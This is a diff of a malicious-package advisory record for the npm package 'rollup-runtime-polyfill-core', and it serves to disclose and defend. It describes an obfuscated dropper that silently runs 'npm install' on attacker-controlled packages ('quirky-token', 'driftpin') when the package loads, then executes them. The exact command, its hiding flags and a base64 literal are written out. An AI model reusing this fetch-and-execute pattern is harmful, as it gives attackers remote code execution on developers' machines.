@@ -1,10 +1,10 @@
 {
-  "modified": "2026-06-24T03:58:02Z",
+  "modified": "2026-07-10T17:12:14Z",
   "published": "2026-06-24T03:58:02Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-6372",
   "summary": "Malicious code in rollup-runtime-polyfill-core (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (e1923adcd8dc53c5f68d2b6f1ef453f5dc52a71fcb2b9e9db502d308e5ef4311)\nPackage name `rollup-runtime-polyfill-core` impersonates the legitimate `rollup-plugin-polyfill-node` and even copies that project's GitHub URL into its own `package.json` `repository.url`. The shipped `dist/index.js` reproduces the legitimate plugin's code with an appended dropper: on module load, `ValidateSvgModule()` decodes a base64 string to the shell command `npm install quirky-token --no-save --silent --no-audit --no-fund` and spawns it; on child close, a second base64 string decodes to `quirky-token`, which is then `require()`d and invoked. Any project that requires this rollup plugin silently downloads and executes arbitrary code from the attacker-controlled `quirky-token` package with the consumer's privileges. The shell command and module name are base64-encoded specifically to evade casual code review and basic static scanners — there is no legitimate reason for a rollup plugin to obfuscate an `npm install` invocation.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (90dc8536f81ef2ffbd391877bbe1eefbefc900081ef6eaa9848548177c233167)\nPackage name mimics the legitimate `rollup-plugin-polyfill-node` and copies its source (the repository field in package.json points to FredKSchott/rollup-plugin-polyfill-node). Appended to dist/index.js is a top-level dropper that runs on every `require()`/`import` of the package. The dropper decodes base64-encoded strings to assemble the command `npm install driftpin --no-save --silent --no-audit --no-fund`, spawns it with `stdio: 'ignore'` and `windowsHide: true` to suppress output, then on process close performs `require('driftpin')` and invokes `getPlugin()()`. The target module name `driftpin` is also stored as a base64 literal (`ZHJpZnRwaW4=`). `driftpin` is not declared in this package's dependencies and is not shipped in the tarball — its content is attacker-controlled and unpinned, so arbitrary code from a separate npm package executes inside the installer's Node process whenever this module is loaded. The combination of name impersonation of a legitimate polyfill, base64 obfuscation of the command and target name, hidden execution flags, and out-of-tree installation of an unrelated package is an unambiguous install/import-time RCE dropper.\n",
   "affected": [
     {
       "package": {
@@ -12,10 +12,28 @@
         "name": "rollup-runtime-polyfill-core"
       },
       "versions": [
-        "0.13.7"
+        "0.13.7",
+        "0.13.9",
+        "0.14.0",
+        "0.13.8"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -52,6 +70,18 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/rollup-runtime-polyfill-core/v/0.13.7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/rollup-runtime-polyfill-core/v/0.13.9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/rollup-runtime-polyfill-core/v/0.14.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/rollup-runtime-polyfill-core/v/0.13.8"
     }
   ],
   "credits": [
@@ -66,13 +96,43 @@
   "database_specific": {
     "malicious-packages-origins": [
       {
-        "id": "IN-MAL-2026-007416",
-        "import_time": "2026-06-24T04:54:33.85164802Z",
-        "modified_time": "2026-06-24T03:58:02Z",
-        "sha256": "e1923adcd8dc53c5f68d2b6f1ef453f5dc52a71fcb2b9e9db502d308e5ef4311",
         "source": "amazon-inspector",
+        "sha256": "e1923adcd8dc53c5f68d2b6f1ef453f5dc52a71fcb2b9e9db502d308e5ef4311",
+        "import_time": "2026-06-24T04:54:33.85164802Z",
+        "id": "IN-MAL-2026-007416",
+        "modified_time": "2026-06-24T03:58:02Z",
         "versions": [
           "0.13.7"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "90dc8536f81ef2ffbd391877bbe1eefbefc900081ef6eaa9848548177c233167",
+        "import_time": "2026-07-10T17:10:16.260533713Z",
+        "id": "IN-MAL-2026-009670",
+        "modified_time": "2026-07-10T16:56:31Z",
+        "versions": [
+          "0.13.9"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "ebd136cb340adff0341c7b4f86b99d7c026ec67693d1d812559e0a56b64698ad",
+        "import_time": "2026-07-10T17:10:16.355177833Z",
+        "id": "IN-MAL-2026-009672",
+        "modified_time": "2026-07-10T16:56:48Z",
+        "versions": [
+          "0.14.0"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "f21236e6de3a458e6dff10d509699f19731342b2b09affbbab93d1856328088e",
+        "import_time": "2026-07-10T17:10:16.403727304Z",
+        "id": "IN-MAL-2026-009673",
+        "modified_time": "2026-07-10T16:56:55Z",
+        "versions": [
+          "0.13.8"
         ]
       }
     ]
